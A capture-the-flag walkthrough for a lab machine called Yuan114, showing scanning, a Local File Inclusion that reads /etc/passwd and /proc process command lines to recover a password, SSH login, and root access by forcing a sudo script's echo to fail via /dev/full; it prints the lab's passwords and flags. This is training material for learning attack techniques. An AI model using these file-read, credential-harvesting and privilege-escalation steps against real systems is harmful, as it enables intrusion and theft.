+++
title = "Yuan114 - Walkthrough"
date = "2026-07-08"
author = "nvru"
description = "Walkthrough for the Yuan114 machine."
tags = ["ctf", "walkthrough", "linux", "apache", "lfi", "procfs", "ssh", "sudo", "privilege-escalation"]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.16`

The objective was to enumerate the target, identify exposed services, exploit a Local File Inclusion vulnerability to obtain credentials, gain SSH access, and escalate privileges through a vulnerable sudo script.

![Machine information](/images/hmv/yuan114/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.16 -- -A -oA nmap/rust
```

### Results

```text
Open 10.10.10.16:22
Open 10.10.10.16:80

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

---

### Nmap

```bash
nmap -sSCV -A -p22,80 10.10.10.16 -oA nmap/22_80 --min-rate=1000
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

Service Info:
OS: Linux
```

Only SSH and HTTP were exposed, so I focused on web enumeration first.

---

# Web Enumeration

## HTTP (Port 80)

Browsing to port 80 revealed a default Apache page with no useful functionality.

![HTTP homepage](/images/hmv/yuan114/http.png)

Inspecting the page source also revealed nothing interesting, so I moved on to directory enumeration.

---

## Directory Enumeration

```bash
gobuster dir \
-u http://10.10.10.16/ \
-w /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
-x html,php,js,txt,xml,sql,bak,wav,jpg,jpeg,png
```

The scan revealed:

```text
/file.php
```

The page returned **HTTP 500**, which suggested it might process input internally.

![Discovered file.php](/images/hmv/yuan114/found_filephp.png)

---

## Local File Inclusion

Since `file.php` appeared to load files, I attempted to identify the required parameter.

```bash
ffuf \
-u "http://10.10.10.16/file.php?FUZZ=/etc/passwd" \
-w /opt/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0
```

The vulnerable parameter was:

```text
file
```

The application allowed arbitrary file reads:

```text
/file.php?file=/etc/passwd
```

The passwd file revealed a local user:

```text
welcome
```

---

## System Enumeration Through LFI

Reading normal files did not immediately provide credentials.

![Contents of /etc/passwd](/images/hmv/yuan114/etc_passwd.png)

I attempted to access SSH keys from the user's home directory, but no useful information was obtained.

Because the vulnerability allowed arbitrary file reads, I started checking the `/proc` filesystem.

The `/proc` filesystem contains runtime information about running processes, including command-line arguments. Sensitive information such as passwords or tokens can sometimes appear there.

Using the LFI vulnerability, I enumerated process command lines:

```bash
for i in {1..1000}; do
    curl -s "http://10.10.10.16/file.php?file=/proc/$i/cmdline" | strings
done
```

A process command line exposed the user's password:

```text
6WXqj9Vc2tdXQ3TN0z54
```

![Recovered password](/images/hmv/yuan114/found_user_passwd.png)

---

# Initial Access

Using the recovered credentials:

```text
Username: welcome
Password: 6WXqj9Vc2tdXQ3TN0z54
```

SSH access was successful.

![SSH as welcome](/images/hmv/yuan114/ssh_as_welcome.png)

---

# Privilege Escalation

## sudo Enumeration

The first thing I checked was sudo permissions:

```bash
sudo -l
```

The user could execute the following scripts as root without a password:

```text
/opt/read.sh
/opt/short.sh
```

![sudo permissions](/images/hmv/yuan114/sudo_l.png)

The scripts were not writable, so I checked the source code.

---

## Script Analysis

![Script source](/images/hmv/yuan114/src.png)

The script uses:

```bash
My_guess=$RANDOM
```

I was not familiar with `$RANDOM` at first and assumed it was related to a process ID. If that was the case, brute-forcing it would not be practical.

![Test short.sh](/images/hmv/yuan114/maybe_pcid.png)

Looking at the last line:

```bash
[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
```

it is just another way of writing the `if` statement above it.

The interesting part is the `echo` command. If `echo` fails, the `||` condition is triggered and the script executes:

```bash
bash -i
```

So instead of guessing the random value, the goal is to make `echo` fail.

---

## Exploiting the Script

I used `/dev/full` to force the output operation to fail.

Unlike `/dev/null`, which discards output normally, `/dev/full` returns an error whenever something is written to it.

Reference:

- [https://en.wikipedia.org/wiki//dev/full](https://en.wikipedia.org/wiki//dev/full)

By redirecting the output to `/dev/full`, `echo` fails and the script executes:

```bash
bash -i
```

giving a root shell.

![Exploit](/images/hmv/yuan114/exploit.png)

The shell worked, but commands like `id` did not show any output because stdout was still redirected.

Redirecting stdout back to the terminal fixed it:

```bash
exec 1>/dev/tty
```

![Output restored](/images/hmv/yuan114/fix_op.png)

After restoring the output, the root shell was fully usable and the flags and credentials were collected.

---

# Credentials

![Flags and passwords](/images/hmv/yuan114/flags_passwd.png)

```text
welcome:6WXqj9Vc2tdXQ3TN0z54
root:6aq56zxVseLt7oApVBc1
```

---

# Flags

## User Flag

```text
flag{user-210f652e7e3b7e7359e523ef04e96295}
```

## Root Flag

```text
flag{root-c3dbe270140775bb9fc6eaa2559f914f}
```
